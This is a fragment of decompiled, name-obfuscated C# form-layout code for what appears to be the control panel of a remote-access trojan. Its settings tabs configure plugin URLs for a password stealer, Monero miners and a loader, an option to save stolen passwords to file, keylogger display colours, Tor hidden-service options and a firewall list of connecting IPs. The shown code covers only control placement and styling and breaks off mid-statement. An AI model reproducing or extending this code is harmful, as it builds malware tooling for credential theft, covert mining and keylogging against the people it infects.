        this.vmethod_262().Margin = new Padding(1);
        this.vmethod_262().Name = "chkPluginsSavePws";
        this.vmethod_262().RightToLeft = RightToLeft.Yes;
        this.vmethod_262().Size = new Size(0x84, 0x11);
        this.vmethod_262().TabIndex = 0x57;
        this.vmethod_262().TabStop = false;
        this.vmethod_262().Text = "Save passwords to file";
        this.vmethod_262().UseVisualStyleBackColor = false;
        this.vmethod_184().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_184().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_184().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_184().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_184().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_184().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_184().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_184().Border.HoverVisible = true;
        this.vmethod_184().Border.Rounding = 6;
        this.vmethod_184().Border.Thickness = 1;
        this.vmethod_184().Border.Type = ShapeTypes.Rounded;
        this.vmethod_184().Border.Visible = true;
        this.vmethod_184().DialogResult = DialogResult.None;
        this.vmethod_184().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_184().Image = null;
        this.vmethod_184().Location = new Point(0x1f2, 0xcc);
        this.vmethod_184().MouseState = MouseStates.Normal;
        this.vmethod_184().Name = "btPluginsSave";
        this.vmethod_184().Size = new Size(0x44, 0x13);
        this.vmethod_184().TabIndex = 0x55;
        this.vmethod_184().Text = "Save";
        this.vmethod_184().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_184().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_184().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_184().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_184().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_184().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_184().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_184().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_130().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_130().Enabled = false;
        this.vmethod_130().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Italic, GraphicsUnit.Point, 0);
        this.vmethod_130().ForeColor = Color.Gray;
        this.vmethod_130().Location = new Point(0x67, 0x53);
        this.vmethod_130().Margin = new Padding(2);
        this.vmethod_130().Name = "txtPluginsURLXMR64Miner";
        this.vmethod_130().Size = new Size(0x13a, 20);
        this.vmethod_130().TabIndex = 0x53;
        this.vmethod_130().Text = "URL to plugin: http://site.com/xmr64.plg";
        this.vmethod_132().AutoSize = true;
        this.vmethod_132().BackColor = Color.Transparent;
        this.vmethod_132().FlatStyle = FlatStyle.Flat;
        this.vmethod_132().Location = new Point(7, 0x56);
        this.vmethod_132().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_132().Name = "lblPluginsXMR64MinerURL";
        this.vmethod_132().Size = new Size(0x5d, 13);
        this.vmethod_132().TabIndex = 0x52;
        this.vmethod_132().Text = "64-Bit XMR Miner:";
        this.vmethod_132().TextAlign = ContentAlignment.TopRight;
        this.vmethod_126().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_126().Enabled = false;
        this.vmethod_126().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Italic, GraphicsUnit.Point, 0);
        this.vmethod_126().ForeColor = Color.Gray;
        this.vmethod_126().Location = new Point(0x67, 0x23);
        this.vmethod_126().Margin = new Padding(2);
        this.vmethod_126().Name = "txtPluginsURLLoader";
        this.vmethod_126().Size = new Size(0x13a, 20);
        this.vmethod_126().TabIndex = 0x51;
        this.vmethod_126().Text = "URL to plugin: http://site.com/loader.plg";
        this.vmethod_128().AutoSize = true;
        this.vmethod_128().BackColor = Color.Transparent;
        this.vmethod_128().FlatStyle = FlatStyle.Flat;
        this.vmethod_128().Location = new Point(0x1f, 0x26);
        this.vmethod_128().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_128().Name = "lblPluginsLoader";
        this.vmethod_128().Size = new Size(0x45, 13);
        this.vmethod_128().TabIndex = 80;
        this.vmethod_128().Text = "64-Bit loader:";
        this.vmethod_128().TextAlign = ContentAlignment.TopRight;
        this.vmethod_114().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_114().AutoSize = true;
        this.vmethod_114().BackColor = Color.Transparent;
        this.vmethod_114().Checked = true;
        this.vmethod_114().CheckState = CheckState.Checked;
        this.vmethod_114().Location = new Point(0x10, 0xca);
        this.vmethod_114().Margin = new Padding(1);
        this.vmethod_114().Name = "chkPluginsUpload";
        this.vmethod_114().RightToLeft = RightToLeft.Yes;
        this.vmethod_114().Size = new Size(0x88, 0x11);
        this.vmethod_114().TabIndex = 0x4e;
        this.vmethod_114().TabStop = false;
        this.vmethod_114().Text = "Upload plugins from PC";
        this.vmethod_114().UseVisualStyleBackColor = false;
        this.vmethod_44().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_44().Enabled = false;
        this.vmethod_44().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Italic, GraphicsUnit.Point, 0);
        this.vmethod_44().ForeColor = Color.Gray;
        this.vmethod_44().Location = new Point(0x67, 0x6b);
        this.vmethod_44().Margin = new Padding(2);
        this.vmethod_44().Name = "txtPluginsURLPws";
        this.vmethod_44().Size = new Size(0x13a, 20);
        this.vmethod_44().TabIndex = 0x35;
        this.vmethod_44().Text = "URL to plugin: http://site.com/pws.plg";
        this.vmethod_46().AutoSize = true;
        this.vmethod_46().BackColor = Color.Transparent;
        this.vmethod_46().FlatStyle = FlatStyle.Flat;
        this.vmethod_46().Location = new Point(0x26, 110);
        this.vmethod_46().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_46().Name = "lblPluginsURLCredentials";
        this.vmethod_46().Size = new Size(0x3d, 13);
        this.vmethod_46().TabIndex = 0x34;
        this.vmethod_46().Text = "Passwords:";
        this.vmethod_46().TextAlign = ContentAlignment.TopRight;
        this.vmethod_42().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_42().Enabled = false;
        this.vmethod_42().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Italic, GraphicsUnit.Point, 0);
        this.vmethod_42().ForeColor = Color.Gray;
        this.vmethod_42().Location = new Point(0x67, 0x3b);
        this.vmethod_42().Margin = new Padding(2);
        this.vmethod_42().Name = "txtPluginsURLXMRMiner";
        this.vmethod_42().Size = new Size(0x13a, 20);
        this.vmethod_42().TabIndex = 0x33;
        this.vmethod_42().Text = "URL to plugin: http://site.com/xmr.plg";
        this.vmethod_38().AutoSize = true;
        this.vmethod_38().BackColor = Color.Transparent;
        this.vmethod_38().FlatStyle = FlatStyle.Flat;
        this.vmethod_38().Location = new Point(0x25, 0x3e);
        this.vmethod_38().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_38().Name = "lblPluginsXMRMinerURL";
        this.vmethod_38().Size = new Size(0x3f, 13);
        this.vmethod_38().TabIndex = 0x16;
        this.vmethod_38().Text = "XMR Miner:";
        this.vmethod_38().TextAlign = ContentAlignment.TopRight;
        this.vmethod_40().AutoSize = true;
        this.vmethod_40().BackColor = Color.Transparent;
        this.vmethod_40().FlatStyle = FlatStyle.Flat;
        this.vmethod_40().Location = new Point(13, 14);
        this.vmethod_40().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_40().Name = "lblPluginsURLs";
        this.vmethod_40().Size = new Size(80, 13);
        this.vmethod_40().TabIndex = 20;
        this.vmethod_40().Text = "URL to plugins:";
        this.vmethod_40().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_112().Image = Class131.smethod_24();
        this.vmethod_112().Location = new Point(0x9b, 0xca);
        this.vmethod_112().Margin = new Padding(2);
        this.vmethod_112().Name = "chkPluginsUploadInfo";
        this.vmethod_112().Size = new Size(15, 15);
        this.vmethod_112().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_112().TabIndex = 0x4f;
        this.vmethod_112().TabStop = false;
        this.vmethod_186().BackColor = SystemColors.AppWorkspace;
        this.vmethod_186().Controls.Add(this.vmethod_264());
        this.vmethod_186().Controls.Add(this.vmethod_258());
        this.vmethod_186().Controls.Add(this.vmethod_260());
        this.vmethod_186().Controls.Add(this.vmethod_194());
        this.vmethod_186().Controls.Add(this.vmethod_196());
        this.vmethod_186().Controls.Add(this.vmethod_198());
        this.vmethod_186().Controls.Add(this.vmethod_200());
        this.vmethod_186().Controls.Add(this.vmethod_192());
        this.vmethod_186().Controls.Add(this.vmethod_188());
        this.vmethod_186().Controls.Add(this.vmethod_190());
        this.vmethod_186().Location = new Point(4, 0x16);
        this.vmethod_186().Name = "tbUI";
        this.vmethod_186().Size = new Size(0x23b, 0xe2);
        this.vmethod_186().TabIndex = 4;
        this.vmethod_186().Text = "UI";
        this.vmethod_264().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_264().AutoSize = true;
        this.vmethod_264().BackColor = Color.Transparent;
        this.vmethod_264().Location = new Point(0x1d, 0x74);
        this.vmethod_264().Margin = new Padding(1);
        this.vmethod_264().Name = "chkUIThumbnails";
        this.vmethod_264().Size = new Size(0x6a, 0x11);
        this.vmethod_264().TabIndex = 0x5b;
        this.vmethod_264().Text = "Show thumbnails";
        this.vmethod_264().UseVisualStyleBackColor = false;
        this.vmethod_258().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_258().AutoSize = true;
        this.vmethod_258().BackColor = Color.Transparent;
        this.vmethod_258().Checked = true;
        this.vmethod_258().CheckState = CheckState.Checked;
        this.vmethod_258().Location = new Point(0x1d, 0x1c);
        this.vmethod_258().Margin = new Padding(1);
        this.vmethod_258().Name = "chkUITray";
        this.vmethod_258().Size = new Size(0x62, 0x11);
        this.vmethod_258().TabIndex = 90;
        this.vmethod_258().Text = "Minimize to tray";
        this.vmethod_258().UseVisualStyleBackColor = false;
        this.vmethod_260().AutoSize = true;
        this.vmethod_260().BackColor = Color.Transparent;
        this.vmethod_260().FlatStyle = FlatStyle.Flat;
        this.vmethod_260().Location = new Point(13, 11);
        this.vmethod_260().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_260().Name = "lblUIGeneral";
        this.vmethod_260().Size = new Size(0x2f, 13);
        this.vmethod_260().TabIndex = 0x59;
        this.vmethod_260().Text = "General:";
        this.vmethod_260().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_194().Image = Class131.smethod_24();
        this.vmethod_194().Location = new Point(0x74, 0xa7);
        this.vmethod_194().Margin = new Padding(2);
        this.vmethod_194().Name = "pbUIKlgColors";
        this.vmethod_194().Size = new Size(15, 15);
        this.vmethod_194().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_194().TabIndex = 0x58;
        this.vmethod_194().TabStop = false;
        this.vmethod_196().AutoSize = true;
        this.vmethod_196().BackColor = Color.Transparent;
        this.vmethod_196().FlatStyle = FlatStyle.Flat;
        this.vmethod_196().Location = new Point(13, 150);
        this.vmethod_196().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_196().Name = "lblUIKlg";
        this.vmethod_196().Size = new Size(0x39, 13);
        this.vmethod_196().TabIndex = 0x57;
        this.vmethod_196().Text = "Keylogger:";
        this.vmethod_196().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_198().AutoSize = true;
        this.vmethod_198().BackColor = Color.Transparent;
        this.vmethod_198().FlatStyle = FlatStyle.Flat;
        this.vmethod_198().Location = new Point(13, 0x3d);
        this.vmethod_198().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_198().Name = "lblUIConTable";
        this.vmethod_198().Size = new Size(90, 13);
        this.vmethod_198().TabIndex = 0x56;
        this.vmethod_198().Text = "Connection table:";
        this.vmethod_198().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_200().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_200().AutoSize = true;
        this.vmethod_200().BackColor = Color.Transparent;
        this.vmethod_200().Checked = true;
        this.vmethod_200().CheckState = CheckState.Checked;
        this.vmethod_200().Location = new Point(0x1d, 0xa7);
        this.vmethod_200().Margin = new Padding(1);
        this.vmethod_200().Name = "chkUIKlgColors";
        this.vmethod_200().Size = new Size(0x54, 0x11);
        this.vmethod_200().TabIndex = 0x55;
        this.vmethod_200().Text = "Show colors";
        this.vmethod_200().UseVisualStyleBackColor = false;
        this.vmethod_192().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_192().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_192().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_192().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_192().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_192().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_192().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_192().Border.HoverVisible = true;
        this.vmethod_192().Border.Rounding = 6;
        this.vmethod_192().Border.Thickness = 1;
        this.vmethod_192().Border.Type = ShapeTypes.Rounded;
        this.vmethod_192().Border.Visible = true;
        this.vmethod_192().DialogResult = DialogResult.None;
        this.vmethod_192().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_192().Image = null;
        this.vmethod_192().Location = new Point(0x1f2, 0xcc);
        this.vmethod_192().MouseState = MouseStates.Normal;
        this.vmethod_192().Name = "btnUISave";
        this.vmethod_192().Size = new Size(0x44, 0x13);
        this.vmethod_192().TabIndex = 0x54;
        this.vmethod_192().Text = "Save";
        this.vmethod_192().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_192().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_192().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_192().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_192().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_192().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_192().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_192().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_188().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_188().AutoSize = true;
        this.vmethod_188().BackColor = Color.Transparent;
        this.vmethod_188().Location = new Point(0x1d, 0x61);
        this.vmethod_188().Margin = new Padding(1);
        this.vmethod_188().Name = "chkGridlines";
        this.vmethod_188().Size = new Size(0x5e, 0x11);
        this.vmethod_188().TabIndex = 0x30;
        this.vmethod_188().Text = "Show gridlines";
        this.vmethod_188().UseVisualStyleBackColor = false;
        this.vmethod_190().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_190().AutoSize = true;
        this.vmethod_190().BackColor = Color.Transparent;
        this.vmethod_190().Checked = true;
        this.vmethod_190().CheckState = CheckState.Checked;
        this.vmethod_190().Location = new Point(0x1d, 0x4e);
        this.vmethod_190().Margin = new Padding(1);
        this.vmethod_190().Name = "chkConNotifications";
        this.vmethod_190().Size = new Size(0xae, 0x11);
        this.vmethod_190().TabIndex = 0x2f;
        this.vmethod_190().Text = "Enable connection notifications";
        this.vmethod_190().UseVisualStyleBackColor = false;
        this.vmethod_202().BackColor = SystemColors.AppWorkspace;
        this.vmethod_202().Controls.Add(this.vmethod_220());
        this.vmethod_202().Controls.Add(this.vmethod_222());
        this.vmethod_202().Controls.Add(this.vmethod_224());
        this.vmethod_202().Controls.Add(this.vmethod_216());
        this.vmethod_202().Controls.Add(this.vmethod_218());
        this.vmethod_202().Controls.Add(this.vmethod_212());
        this.vmethod_202().Controls.Add(this.vmethod_210());
        this.vmethod_202().Controls.Add(this.vmethod_204());
        this.vmethod_202().Controls.Add(this.vmethod_206());
        this.vmethod_202().Controls.Add(this.vmethod_208());
        this.vmethod_202().Controls.Add(this.vmethod_214());
        this.vmethod_202().Location = new Point(4, 0x16);
        this.vmethod_202().Name = "tbTor";
        this.vmethod_202().Size = new Size(0x23b, 0xe2);
        this.vmethod_202().TabIndex = 5;
        this.vmethod_202().Text = "Tor";
        this.vmethod_220().Image = Class131.smethod_24();
        this.vmethod_220().Location = new Point(0xfb, 0x86);
        this.vmethod_220().Margin = new Padding(2);
        this.vmethod_220().Name = "pbTorConstrainedSocketSize";
        this.vmethod_220().Size = new Size(15, 15);
        this.vmethod_220().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_220().TabIndex = 0x61;
        this.vmethod_220().TabStop = false;
        this.vmethod_222().Enabled = false;
        this.vmethod_222().Location = new Point(0xb8, 0x83);
        this.vmethod_222().Margin = new Padding(1);
        this.vmethod_222().MaxLength = 6;
        this.vmethod_222().Name = "txtTorConstrainedSocketSize";
        this.vmethod_222().Size = new Size(0x40, 20);
        this.vmethod_222().TabIndex = 0x60;
        this.vmethod_222().Text = "8192";
        this.vmethod_224().BackColor = Color.Transparent;
        this.vmethod_224().Enabled = false;
        this.vmethod_224().FlatStyle = FlatStyle.Flat;
        this.vmethod_224().Location = new Point(0x37, 0x86);
        this.vmethod_224().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_224().Name = "lblTorConstrainedSocketSize";
        this.vmethod_224().Size = new Size(0x7f, 13);
        this.vmethod_224().TabIndex = 0x5f;
        this.vmethod_224().Text = "Constrained socket size:";
        this.vmethod_224().TextAlign = ContentAlignment.TopRight;
        this.vmethod_216().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_216().AutoSize = true;
        this.vmethod_216().BackColor = Color.Transparent;
        this.vmethod_216().Location = new Point(0x1d, 0x72);
        this.vmethod_216().Margin = new Padding(1);
        this.vmethod_216().Name = "chkTorConstrainedSockets";
        this.vmethod_216().Size = new Size(0x8f, 0x11);
        this.vmethod_216().TabIndex = 0x5d;
        this.vmethod_216().Text = "Use constrained sockets";
        this.vmethod_216().UseVisualStyleBackColor = false;
        this.vmethod_218().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_218().AutoSize = true;
        this.vmethod_218().BackColor = Color.Transparent;
        this.vmethod_218().Checked = true;
        this.vmethod_218().CheckState = CheckState.Checked;
        this.vmethod_218().Location = new Point(0x1d, 0x5f);
        this.vmethod_218().Margin = new Padding(1);
        this.vmethod_218().Name = "chkTorNoExec";
        this.vmethod_218().Size = new Size(0xe8, 0x11);
        this.vmethod_218().TabIndex = 0x5c;
        this.vmethod_218().Text = "Prevent execution of third party applications";
        this.vmethod_218().UseVisualStyleBackColor = false;
        this.vmethod_212().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_212().AutoSize = true;
        this.vmethod_212().BackColor = Color.Transparent;
        this.vmethod_212().Checked = true;
        this.vmethod_212().CheckState = CheckState.Checked;
        this.vmethod_212().Location = new Point(0x1d, 0x4c);
        this.vmethod_212().Margin = new Padding(1);
        this.vmethod_212().Name = "chkTorRejectSingleHop";
        this.vmethod_212().Size = new Size(0x8d, 0x11);
        this.vmethod_212().TabIndex = 0x5b;
        this.vmethod_212().Text = "Reject single hop clients";
        this.vmethod_212().UseVisualStyleBackColor = false;
        this.vmethod_210().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_210().AutoSize = true;
        this.vmethod_210().BackColor = Color.Transparent;
        this.vmethod_210().Checked = true;
        this.vmethod_210().CheckState = CheckState.Checked;
        this.vmethod_210().Location = new Point(0x1d, 0x39);
        this.vmethod_210().Margin = new Padding(1);
        this.vmethod_210().Name = "chkTorAvoidDiskWrites";
        this.vmethod_210().Size = new Size(0x69, 0x11);
        this.vmethod_210().TabIndex = 90;
        this.vmethod_210().Text = "Avoid disk writes";
        this.vmethod_210().UseVisualStyleBackColor = false;
        this.vmethod_204().AutoSize = true;
        this.vmethod_204().BackColor = Color.Transparent;
        this.vmethod_204().FlatStyle = FlatStyle.Flat;
        this.vmethod_204().Location = new Point(13, 15);
        this.vmethod_204().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_204().Name = "Label1";
        this.vmethod_204().Size = new Size(0x76, 13);
        this.vmethod_204().TabIndex = 0x59;
        this.vmethod_204().Text = "Hidden service options:";
        this.vmethod_204().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_206().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_206().AutoSize = true;
        this.vmethod_206().BackColor = Color.Transparent;
        this.vmethod_206().Checked = true;
        this.vmethod_206().CheckState = CheckState.Checked;
        this.vmethod_206().Location = new Point(0x1d, 0x26);
        this.vmethod_206().Margin = new Padding(1);
        this.vmethod_206().Name = "chkTorDisableCache";
        this.vmethod_206().Size = new Size(0x66, 0x11);
        this.vmethod_206().TabIndex = 0x58;
        this.vmethod_206().Text = "Disable caching";
        this.vmethod_206().UseVisualStyleBackColor = false;
        this.vmethod_208().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_208().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_208().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_208().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_208().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_208().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_208().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_208().Border.HoverVisible = true;
        this.vmethod_208().Border.Rounding = 6;
        this.vmethod_208().Border.Thickness = 1;
        this.vmethod_208().Border.Type = ShapeTypes.Rounded;
        this.vmethod_208().Border.Visible = true;
        this.vmethod_208().DialogResult = DialogResult.None;
        this.vmethod_208().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_208().Image = null;
        this.vmethod_208().Location = new Point(0x1f2, 0xcc);
        this.vmethod_208().MouseState = MouseStates.Normal;
        this.vmethod_208().Name = "btnTorSave";
        this.vmethod_208().Size = new Size(0x44, 0x13);
        this.vmethod_208().TabIndex = 0x55;
        this.vmethod_208().Text = "Save";
        this.vmethod_208().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_208().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_208().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_208().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_208().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_208().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_208().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_208().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_214().Image = Class131.smethod_24();
        this.vmethod_214().Location = new Point(0xaf, 0x73);
        this.vmethod_214().Margin = new Padding(2);
        this.vmethod_214().Name = "pbTorContrainedSockets";
        this.vmethod_214().Size = new Size(15, 15);
        this.vmethod_214().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_214().TabIndex = 0x5e;
        this.vmethod_214().TabStop = false;
        this.vmethod_232().BackColor = SystemColors.AppWorkspace;
        this.vmethod_232().Controls.Add(this.vmethod_256());
        this.vmethod_232().Controls.Add(this.vmethod_244());
        this.vmethod_232().Controls.Add(this.vmethod_242());
        this.vmethod_232().Controls.Add(this.vmethod_234());
        this.vmethod_232().Controls.Add(this.vmethod_236());
        this.vmethod_232().Controls.Add(this.vmethod_238());
        this.vmethod_232().Controls.Add(this.vmethod_240());
        this.vmethod_232().Location = new Point(4, 0x16);
        this.vmethod_232().Name = "tbFirewall";
        this.vmethod_232().Padding = new Padding(3);
        this.vmethod_232().Size = new Size(0x23b, 0xe2);
        this.vmethod_232().TabIndex = 6;
        this.vmethod_232().Text = "Firewall";
        this.vmethod_256().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_256().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_256().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_256().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_256().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_256().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_256().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_256().Border.HoverVisible = true;
        this.vmethod_256().Border.Rounding = 6;
        this.vmethod_256().Border.Thickness = 1;
        this.vmethod_256().Border.Type = ShapeTypes.Rounded;
        this.vmethod_256().Border.Visible = true;
        this.vmethod_256().DialogResult = DialogResult.None;
        this.vmethod_256().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_256().Image = null;
        this.vmethod_256().Location = new Point(0x1ad, 0xc3);
        this.vmethod_256().MouseState = MouseStates.Normal;
        this.vmethod_256().Name = "btnFWReload";
        this.vmethod_256().Size = new Size(0x49, 0x13);
        this.vmethod_256().TabIndex = 0x76;
        this.vmethod_256().Text = "Reload list";
        this.vmethod_256().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_256().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_256().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_256().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_256().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_256().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_256().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_256().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_244().Alignment = ListViewAlignment.Left;
        this.vmethod_244().get_AllColumns().Add(this.vmethod_246());
        this.vmethod_244().get_AllColumns().Add(this.vmethod_248());
        this.vmethod_244().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_244().AutoArrange = false;
        this.vmethod_244().BorderStyle = BorderStyle.None;
        this.vmethod_244().set_CellEditUseWholeCell(false);
        ColumnHeader[] values = new ColumnHeader[] { this.vmethod_246(), this.vmethod_248() };
        this.vmethod_244().get_Columns().AddRange(values);
        this.vmethod_244().ContextMenuStrip = this.vmethod_252();
        this.vmethod_244().Cursor = Cursors.Default;
        this.vmethod_244().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_244().FullRowSelect = true;
        this.vmethod_244().HeaderStyle = ColumnHeaderStyle.Nonclickable;
        this.vmethod_244().HideSelection = false;
        this.vmethod_244().Location = new Point(1, 1);
        this.vmethod_244().Margin = new Padding(1);
        this.vmethod_244().Name = "lvFirewall";
        this.vmethod_244().set_ShowGroups(false);
        this.vmethod_244().Size = new Size(0x239, 0xbd);
        this.vmethod_244().TabIndex = 0x75;
        this.vmethod_244().set_UseCellFormatEvents(true);
        this.vmethod_244().UseCompatibleStateImageBehavior = false;
        this.vmethod_244().set_UseHotControls(false);
        this.vmethod_244().set_UseOverlays(false);
        this.vmethod_244().set_View(View.Details);
        this.vmethod_244().VirtualMode = true;
        this.vmethod_246().set_AspectName("IP");
        this.vmethod_246().set_Hideable(false);
        this.vmethod_246().Text = "IP";
        this.vmethod_246().set_Width(120);
        this.vmethod_248().set_AspectName("ATTEMPTS");
        this.vmethod_248().set_Hideable(false);
        this.vmethod_248().Text = "Attempts";
        this.vmethod_252().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] toolStripItems = new ToolStripItem[] { this.vmethod_254() };
        this.vmethod_252().Items.AddRange(toolStripItems);
        this.vmethod_252().Name = "ContextMenuStrip1";
        this.vmethod_252().Size = new Size(0xa4, 0x1a);
        this.vmethod_254().Name = "RemoveToolStripMenuItem";
        this.vmethod_254().Size = new Size(0xa3, 0x16);
        this.vmethod_254().Text = "Remove selected";
        this.vmethod_242().Image = Class131.smethod_24();
        this.vmethod_242().Location = new Point(0xe9, 0xc3);
        this.vmethod_242().Margin = new Padding(2);
        this.vmethod_242().Name = "pbFWInfo";
        this.vmethod_242().Size = new Size(15, 15);
        this.vmethod_242().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_242().TabIndex = 0x74;
        this.vmethod_242().TabStop = false;
        this.vmethod_234().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_234().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_234().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_234().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_234().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_234().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_234().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_234().Border.HoverVisible = true;
        this.vmethod_234().Border.Rounding = 6;
        this.vmethod_234().Border.Thickness = 1;
        this.vmethod_234().Border.Type = ShapeTypes.Rounded;
        this.vmethod_234().Border.Visible = true;
        this.vmethod_234().DialogResult = DialogResult.None;
        this.vmethod_234().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_234().Image = null;
        this.vmethod_234().Location = new Point(0x206, 0xc3);
